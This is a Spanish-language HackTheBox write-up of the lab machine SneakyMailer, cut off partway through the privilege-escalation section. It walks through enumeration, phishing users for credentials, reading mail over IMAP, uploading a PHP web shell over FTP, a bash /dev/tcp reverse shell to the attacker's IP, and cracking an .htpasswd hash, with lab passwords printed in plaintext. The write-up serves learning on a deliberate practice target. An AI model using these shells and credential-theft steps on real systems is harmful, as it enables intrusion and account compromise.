---
layout      : post
title       : "HackTheBox - SneakyMailer"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bannersneakymailer.png
category    : [ htb ]
tags        : [ phishing, FTP, PyPi, sudo ]
---
Máquina Linux nivel medio pero que de medio muy poco, o pues casi me enloquezco :P SneakyMailer... Vaya locura, jugaremos simulando phishing, explotaremos cositas de FTP, romperemos PyPi para crearnos un paquete malicioso y generar ejecución remota de comandos y trolearemos un poco con los permisos de usuario.

![sneakymailerHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/sneakymailerHTB.png)

### TL;DR (Spanish writeup)

¡Esta máquina fue una vaina loca!

Hola, empezaremos con una enumeración básica en la que encontraremos unos correos, nos aprovecharemos de ellos para realizar peticiones a cada uno de los mails estando a la escucha en nuestra máquina a ver si alguno nos responde... En pocas palabras algo muy parecido al `phishing`. Un usuario nos responderá, obtendremos info con el cual podremos entrar al servicio `ICMP` y validar el inbox de ese correo. Nos encontraremos con 2 interesantes, de uno podremos entrar al servicio `FTP` y con el otro tendremos referencia de algo que usaremos posteriormente... Usando el servicio `FTP` podremos subir archivos, subiremos un archivo que nos permita ejecutar comandos, obtendremos una reverse Shell como el usuario `www-data`, pero podremos usar las mismas credenciales para convertirnos en el usuario `developer`.

Encontraremos que podemos subir paquetes de terceros en el repositorio PyPI, usaremos eso para crear nuestro propio paquete con código malicioso y subirlo a la máquina. Con ello obtendremos un Shell como el usuario `low`, validando sus permisos nos daremos cuenta que puede ejecutar `/usr/bin/pip3` como el usuario administrador, crearemos un paquete temporal el cual nos brinde una Shell, al ser ejecutado con permisos de administrador, obtendremos una sesión como el :)

Eso es en pocas palabras, que empiece el bailoteo :)

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) además me enfoco en plasmar mis errores y exitos (por si ves mucho texto).

Este writeup va a ser largo :P

...

### Fases

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

```bash
–» nmap -p- --open -v -n 10.10.10.197
```

Pero va lento, agregando `-T` va más rápido. (Sin embargo es importante hacer un escaneo total, sin cambios, así vaya lento, que nos permita ver si `-T` obvia/pasa algún puerto.

```bash
–» nmap -p- --open -T5 -v -n 10.10.10.197 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -T5        | Forma de escanear súper rápido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos) |
| -n         | Evita que realice Host Discovery, en este caso el DNS (n)                                                |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en formato grepeable (para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos)                  |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Tue Oct 13 25:25:25 2020 as: nmap -p- --open -T5 -v -n -oG initScan 10.10.10.197
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.197 ()   Status: Up
Host: 10.10.10.197 ()   Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http///, 143/open/tcp//imap///, 993/open/tcp//imaps///, 8080/open/tcp//http-proxy///
```

Obtenemos los puertos:

* 21: FTP (Protocolo para transferencia de archivos)
* 22: SSH (Secure Shell)
* 25: SMTP (Protocolo para transferencia simple de correo)
* 80: Servidor web
* 143: IMAP (Protocolo de acceso a los mensajes de internet)
* 993: IMAPS (Protocolo de acceso a los mensajes de internet sobre TLS)
* 8080: Proxy

Procedemos a nuestro escaneo de versiones y scripts.

```bash
–» nmap -p 21,22,25,80,143,993,8080 -sC -sV 10.10.10.197 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Tue Oct 13 25:25:25 2020 as: nmap -p21,22,25,80,143,993,8080 -sC -sV -oN portScan 10.10.10.197
Nmap scan report for 10.10.10.197
Host is up (0.19s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: UTF8=ACCEPTA0001 THREAD=ORDEREDSUBJECT ENABLE IDLE CHILDREN THREAD=REFERENCES IMAP4rev1 OK QUOTA ACL2=UNION STARTTLS CAPABILITY SORT UIDPLUS completed ACL NAMESPACE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: UTF8=ACCEPTA0001 THREAD=ORDEREDSUBJECT AUTH=PLAIN ENABLE IDLE CHILDREN THREAD=REFERENCES IMAP4rev1 OK QUOTA ACL2=UNION completed CAPABILITY SORT UIDPLUS ACL NAMESPACE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Perfecto, veamos que tenemos:

* **FTP** y **SSH** no presentan vulnerabilidades públicas
* **SMTP** esta sobre el servidor de correo *postfix*, el cual es un software para el enrutamiento y envió de correo electrónico.
* **HTTP** y **HTTPS** están sobre *nginx*, el cual provee servicios de correo electrónico. **HTTP** hace un redirect a *sneakycorp.htb* (agregaremos el dominio al archivo hosts)
* **IMAP** e **IMAPS** corren bajo el servicio *Courier IMAP server*. Así mismo tenemos alguna data que posiblemente nos sirva para algo después.

...

#### > Puerto 80 (HTTP)

Agregamos `sneakycorp.htb` al archivo `/etc/hosts`

```bash
–» cat /etc/hosts
127.0.0.1       localhost
10.10.10.197  sneakycorp.htb
```

A ver...

![pagesneakycorp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pagesneakycorp.png)

Nos encontramos con un dashboard con información de proyectos, algunas notificaciones y alertas de mensaje con su remitente (posibles usuarios)

Tenemos un apartado **Team** en la parte izquierda, veamos:

![pageteam](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pageteam.png)

Interesante, tenemos también posibles usuarios junto a los correos, juguemos con **curL** y **grep** para extraernos los correos y usuarios en archivos.

```bash
–» curl -s http://sneakycorp.htb/team.php | grep -oP "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" > emails.txt
–» cat emails.txt 
tigernixon@sneakymailer.htb
garrettwinters@sneakymailer.htb
ashtoncox@sneakymailer.htb
...
```

> \b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b

| Expresión      | Descripción   |
| ---------------|:------------- |
| \b             | Marca la posición de una palabra limitada por espacios en blanco, puntuación o el inicio/final de una cadena. |
| A-Za-z0-9._%+- | Extrae cualquier carácter en mayúscula o minúscula, números y los símbolos (._%+-)                            |
| +@             | Seguido del símbolo **@**.                                                                                    |
| +\.            | Seguido del símbolo **.** (punto)                                                                             |
| {2,6}          | Realiza el último grupo de 2 a 6 veces, para extraer: com, org, htb, es, etc.                               |

* Referencia de [Wikipedia](https://es.wikipedia.org/wiki/Expresi%C3%B3n_regular#Descripci%C3%B3n_de_las_expresiones_regulares)

Podemos usar el archivo de `emails.txt` para extraer los usuarios, se puede hacer de varias formas:

```bash
–» cat emails.txt | tr '@' ' ' | awk '{print $1}' > users.txt
–» cat users.txt  
tigernixon
garrettwinters
ashtoncox  
cedrickelly  
airisatou 
...
```

Listo, si hacemos descubrimiento de rutas con `wfuzz` no vemos nada diferente a lo que nos brindó la página inicialmente.

![bashwfuzz](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bashwfuzz.png)

Revisando la estructura **HTML** con **CTRL + U** encontramos esto:

![pagepypinote](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pagepypinote.png)

Veamos:

![pagepypiregister](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pagepypiregister.png)

Registramos una cuenta, no obtenemos ningún output ni nada, solo limpia los campos. Nada más por el momento, démosle de una al proxy.

#### > Puerto 8080

![pageproxy](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pageproxy.png)

El display por default, veamos si podemos encontrar algo más usando **wfuzz**... Solo encontramos `index.html`...

#### > Puerto 25

Bueno, realmente el inicio de esta máquina me estaba matando, literalmente no entendía nada de lo que debía hacer o tenía ideas claramente erróneas. Lo más óptimo y necesario fue pedir ayuda, primero me fui para el [foro](https://forum.hackthebox.eu/discussion/3564/official-sneakymailer-discussion/p1) oficial de la máquina, varios hacían caer en cuenta sobre que sería lo primero en probar al tener tantos correos... Hablaban de enviar <<algo>> a cada usuario y estar "atento"...

Realmente estaba muy confundido, encontré herramientas para enviar correo, probé enviar los mails y esperar alguna respuesta en el mail temporal que estaba usando, pero nada, no entendía que debía esperar o como... Decidí preguntarle a [TazWake](https://www.hackthebox.eu/profile/49335) que es moderador y Omniscient en hackthebox, además de ser una persona superpuesta a ayudar y todo un master.

**Thank you TazWake**.

## Explotación [#](#explotacion) {#explotacion}

Resulta que la idea estaba medianamente bien, si bien debemos enviar emails a cada usuario, en el proceso uno de ellos nos va a responder con "algo"... Pero debemos estar en escucha en nuestra máquina, ósea levantar un servidor web en el que estemos pendientes de sí alguno de ellos intenta entrar y ver que obtenemos... Esto me rompió la cabeza, ya que me parece superloco y supernuevo.

Buscando por internet una de las herramientas que encontré fue [swaks](http://www.jetmore.org/john/code/swaks/), el cual nos va a ayudar a enviar los emails con toda la info y el body (en el cual pondremos el link del servidor web que montamos).

Los pasos que hice fueron estos:

1. Apoyarnos de un correo temporal, usaremos esa dirección de email como origen.
2. Crearnos un script que tome cada correo y realice el envío de la data.
3. Ponernos en escucha con `nc`.
4. Ejecutar el script.

Y esto es lo que recibimos cuando se le envía el correo a `glorialittle@sneakymailer.htb`.

![bashlisteneremail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bashlisteneremail.png)

> `emails.txt` tiene todos los correos, la primera prueba fue con el, cuando obtuve algo evite volver a hacer todo el envio y recorte en `emails1.txt` desde antes del correo de **gloria**.

QUE LOCURAAAAAAAAAAAAAAAAAA. Me encanto, pero me exploto la cabeza :o Sigamos...

Si quitamos el URLencode realizado obtenemos esto:

```bash
# Original output
firstName=Paul
lastName=Byrd
email=paulbyrd%40sneakymailer.htb
password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

# Decode output
firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

#### > Puertos 143 y 993

Inicialmente intente entrar a **SSH** y **FTP** con esas credenciales, pero no fue posible. Así que nos queda revisar si podemos entrar al email por medio de **imap**.

```bash
# Por medio del puerto seguro 
–» openssl s_client -connect 10.10.10.197:993

# O sin él
–» nc 10.10.10.197 143
–» telnet 10.10.10.197 143
```

Estando dentro podemos logearnos con las credenciales encontradas

```bash
A1 LOGIN paulbyrd "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
A1 OK LOGIN Ok.
```

> El **A1** es un `tag` (que puede ser cualquier sucesion de caracteres) que se usa siempre en cada linea antes de un comando en IMAP.

Listemos los buzones:

```bash
A1 LIST "" *
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
A1 OK LIST completed
```

Veamos cuantos mails hay en cada buzón:

```bash
A1 STATUS INBOX (MESSAGES)
* STATUS "INBOX" (MESSAGES 0)
A1 OK STATUS Completed.
A1 STATUS INBOX.Sent (MESSAGES)
* STATUS "INBOX.Sent" (MESSAGES 0)
A1 OK STATUS Completed.
A1 STATUS INBOX.Trash (MESSAGES)
* STATUS "INBOX.Trash" (MESSAGES 0)
A1 OK STATUS Completed.
A1 STATUS "INBOX.Deleted Items" (MESSAGES)
* STATUS "INBOX.Deleted Items" (MESSAGES 0)
A1 OK STATUS Completed.
A1 STATUS "INBOX.Sent Items" (MESSAGES)
* STATUS "INBOX.Sent Items" (MESSAGES 2)
A1 OK STATUS Completed.
```

Vemos en el buzón `INBOX.Sent Items` que hay 2 correos enviados, enfoquémonos en eso:

```bash
A1 SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
A1 OK [READ-WRITE] Ok
```

Podemos ver el header de los dos correos de la siguiente forma:

```bash
A1 FETCH 1:2 (BODY[HEADER])
* 1 FETCH (BODY[HEADER] {279}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

)
* 2 FETCH (BODY[HEADER] {419}
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

)
A1 OK FETCH completed.
```

Vemos en uno de ellos el asunto: **Password reset**. Seguimos, veamos el contenido de cada email:

```bash
A1 FETCH 1 (BODY)
* 1 FETCH (BODY (("text" "plain" ("charset" "utf-8") NIL NIL "quoted-printable" 196 7)("text" "html" ("charset" "utf-8") NIL NIL "quoted-printable" 1381 32) "alternative"))
A1 OK FETCH completed.
```

Cuando hacemos el `BODY` el mensaje usualmente está dividido en partes:

1. Nos dice que está en `text` `plain` y tiene 196 caracteres.
2. Está en formato `text` `html` y tiene 1381 caracteres.

Démosle:

```bash
A1 FETCH 1 (BODY[1])
* 1 FETCH (BODY[1] {196}
Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20
)
A1 OK FETCH completed.
A1 FETCH 1 (BODY[2])
* 1 FETCH (BODY[2] {1381}
<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"><head><meta ht=
...
```

La parte **2** simplemente es la representación en `html` del texto plano :)

Bueno obtenemos nuevas credenciales que probablemente nos sirvan (como pueda que no :P)

* **Username**: developer
* **Password (original)**: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

...

Veamos el segundo correo:

```bash
A1 FETCH 2 (BODY)
* 2 FETCH (BODY ("text" "plain" ("charset" "utf-8" "format" "flowed") NIL NIL "7bit" 166 6))
A1 OK FETCH completed.
A1 FETCH 2 (BODY[1])
* 2 FETCH (BODY[1] {166}
Hello low


Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.

)
A1 OK FETCH completed.
```

Acá vemos 2 cosas interesantes:

* Saluda a **low**, podemos guardarlo como usuario por si algo :)
* Nos habla de los módulos de Python en su servicio PyPI, probablemente debamos explotar algún módulo o buscar algo loco por ahí.

> [Python Package Index o PyPI](https://es.wikipedia.org/wiki/%C3%8Dndice_de_paquetes_de_Python) es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.

Listo, ya vimos todo lo que podíamos obtener del correo dé `paulbyrd`.

Los comandos e información sobre **imap** los obtuve de estos recursos:

* [telnet-imap-commands-note](https://busylog.net/telnet-imap-commands-note/).
* [access-imap-server-from-the-command-line-using-openssh](https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html).
* [hacktricks.xyz-pentesting-imap](https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax).

#### > Puerto 21 (FTP)

Probando cada usuario (`low` y `developer`) con **FTP** y **SSH**, podemos entrar con `developer` al servicio **FTP**.

![bashftpdevdir](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bashftpdevdir.png)

De los archivos montados no hay nada interesante, vemos que estamos sobre el servidor web, lo que subamos o hagamos se verá reflejado en el puerto 80. Tenemos la carpeta `/pypi` y si relacionamos el correo donde se habla de módulos de Python, que debemos instalar, probar y borrar. Podemos entender que esta carpeta deberá ser nuestro sitio de trabajo :) Validaremos como lograr subir "X" tipo de archivos por medio de FTP, ya que no permite subir cualquiera (creo).

#### > Puerto 80 (HTTP)

Cuando estuve en el foro una persona escribió que el vhost es importante. Así que me quedo la duda y buscando por internet que herramienta puede ayudarnos, usaremos [gobuster](https://github.com/OJ/gobuster) la cual hace un fuzzing de Virtual Hosting sobre el servicio:

```bash
–» gobuster vhost -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://sneakycorp.htb
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://sneakycorp.htb
[+] Threads:      10
[+] Wordlist:     /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/10/20 18:20:05 Starting gobuster
===============================================================
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
Found: ..sneakycorp.htb (Status: 400) [Size: 173]
Found: DEV.sneakycorp.htb (Status: 200) [Size: 13742]
Found: Dev.sneakycorp.htb (Status: 200) [Size: 13742]
Found: .html..sneakycorp.htb (Status: 400) [Size: 173]
Found: .htm..sneakycorp.htb (Status: 400) [Size: 173]
...
```

Encontramos un nuevo dominio: `dev.sneakycorp.htb`, pongámoslo en el `/etc/hosts` y veamos que hay:

```bash
–» cat /etc/hosts
127.0.0.1       localhost
10.10.10.197  sneakycorp.htb
10.10.10.197  dev.sneakycorp.htb
```

![pagedevsneaky](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pagedevsneaky.png)

El apartado para registrarse, en este caso está visible aunque si nos "registramos" no pasa nada :P. Lo que veo importante es que tenemos acceso al usuario `developer` por **FTP** y acabamos de encontrar el sitio `dev.sneakycorp.htb` con el que probablemente lo que subamos mediante **FTP** se verá reflejado acá...

Y si recordamos estamos en lo correcto, ya que al logearnos sobre **FTP** lo primero que vemos (la estructura) es: 

* `/dev` > `/lista de folders y archivos` > `/pypi` > `/register.php`

Listo, lo que nos queda es saber que "módulos" o "paquetes" de Python podemos subir (donde y como :P) con **FTP** :)

#### > Puerto 21 (FTP)

Testeando algunas cosas vi que nos deja crear carpetas, pero no nos deja listar su contenido:

```bash
ftp> cd dev
250 Directory successfully changed.
ftp> mkdir t3s7_h78
257 "/dev/t3s7_h78" created
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
d-wxrw-rw-    2 1001     1001         4096 Oct 21 11:46 t3s7_h78
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp> cd t3s7_h78
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Transfer done (but failed to open directory).
ftp>
...
# En nuestra maquina:
–» echo "hola" > jay.txt
...
ftp> put jay.txt
local: jay.txt remote: jay.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5 bytes sent in 0.00 secs (143.6121 kB/s)
ftp> 
```

Revisemos la web:

![paget3s7404](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/paget3s7404.png)

Hagámosla más sencilla, montemos el archivo en la raíz:

```bash
ftp> cd dev                                                          
250 Directory successfully changed.
ftp> put jay.txt
local: jay.txt remote: jay.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5 bytes sent in 0.00 secs (110.9730 kB/s)
ftp> 
```

Validemos:

```bash
–» curl -s http://dev.sneakycorp.htb/jay.txt
hola
```

Perfecto, intentemos hacer ejecución de comandos remotamente:

```bash
–» cat locurasdices.php 
<?php $out=shell_exec($_GET['xmd']); echo $out; ?>
```

Y subámoslo:

```bash
ftp> put locurasdices.php
local: locurasdices.php remote: locurasdices.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
51 bytes sent in 0.00 secs (465.4644 kB/s)
ftp>
```

Validamos:

```bash
–» curl -s http://dev.sneakycorp.htb/locurasdices.php?xmd=whoami
www-data
```

Listo, tenemos ejecución de comandos en el sistema, generemos una reverse Shell, nos ponemos en escucha:

```bash
–» nc -nvlp 4433
```

```bash
–» curl -s http://dev.sneakycorp.htb/locurasdices.php?xmd=bash -c 'bash -i >& /dev/tcp/10.10.15.86/4433 0>&1'
```

Pero no sucede nada, pasémosla a [URLencode](https://www.urlencoder.org/):

```bash
–» curl -s http://dev.sneakycorp.htb/locurasdices.php?xmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.86%2F4433%200%3E%261%27
```

![bash1reverseshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bash1reverseshell.png)

PERFECTO, sigamos enumerando.

Vemos varias cositas:

```bash
www-data@sneakymailer:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
low:x:1000:1000:,,,:/home/low:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
postfix:x:108:116::/var/spool/postfix:/usr/sbin/nologin
courier:x:109:118::/var/lib/courier:/usr/sbin/nologin
vmail:x:5000:5000::/home/vmail:/usr/sbin/nologin
developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash
pypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin
www-data@sneakymailer:~$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 May 14 17:10 .
drwxr-xr-x 18 root  root  4096 May 14 05:30 ..
drwxr-xr-x  8 low   low   4096 Jun  8 03:47 low
drwx------  5 vmail vmail 4096 May 19 21:10 vmail
www-data@sneakymailer:~$ 
```

* Usuario `low`, que tiene la bandera `user.txt`.
* `pypi`, que probablemente debamos jugar con el para el manejo de módulos PyPI. Y un nuevo dominio: `pypi.sneakycorp.htb`.

Validando el dominio en la web nos redirecciona al host principal, pero si lo probamos con el puerto **8080** tenemos esto:

![pagepypi8080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/pagepypi8080.png)

* Vemos algunas "indicaciones" interesantes.
* Si damos clic sobre `here` o `simple` obtenemos la pantalla que pide credenciales.

Volvamos a la consola, migrémonos a `developer` usando la pw de **FTP** y busquemos algo relacionado a credenciales.

```bash
developer@sneakymailer:~/pypi.sneakycorp.htb$ ls -la
ls -la
total 20
drwxr-xr-x 4 root root     4096 May 15 14:29 .
drwxr-xr-x 6 root root     4096 May 14 18:25 ..
-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd
drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages
drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd
cat .htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

* pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

Obtenemos un hash **Apache $apr1$ MD5, md5apr1, MD5 (APR) 2**. vamos a crackearlo para poder ver el contenido en la página web.

> **.htpasswd** es una utilidad que tiene por función almacenar contraseñas de forma cifrada para ser utilizadas por Apache en servicios de autenticación. [Desde Linux](https://blog.desdelinux.net/como-proteger-nuestros-sitios-usando-htpasswd-ejemplos/)

* [Gran artículo explicando como funciona el archivo **.htpasswd**](https://blog.desdelinux.net/como-proteger-nuestros-sitios-usando-htpasswd-ejemplos/).

Usando `john-the-ripper` logramos el objetivo:

```bash
–» john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hashpypi 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:40 7,80% (ETA: 14:46:19) 0g/s 7896p/s 7896c/s 7896C/s spgg300385..spgcmcr
0g 0:00:02:51 8,40% (ETA: 14:46:03) 0g/s 7917p/s 7917c/s 7917C/s rebeca260395..rebeca22
soufianeelhaoui  (?)
1g 0:00:08:26 DONE (2020-10-22 14:20) 0.001974g/s 7137p/s 7137c/s 7137C/s soufina..soufianeelhaoui
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Validamos y pasamos el "login", aunque no nos muestra nada, pero probablemente más adelante debamos usar las credenciales.

Bueno, con base en lo que nos muestra `http://pypi.sneakycorp.htb:8080/` nos da una idea que podemos instalar paquetes en su "repositorio" interno. Pues creemos nuestro paquete malicioso y subámoslo al repositorio `pypi.sneakycorp.htb/simple`.

...

Buscando en internet sobre maneras de explotar PyPI y sus paquetes, encontré unos retos tipo CTF para aprender sobre el tema, acá se los dejo:

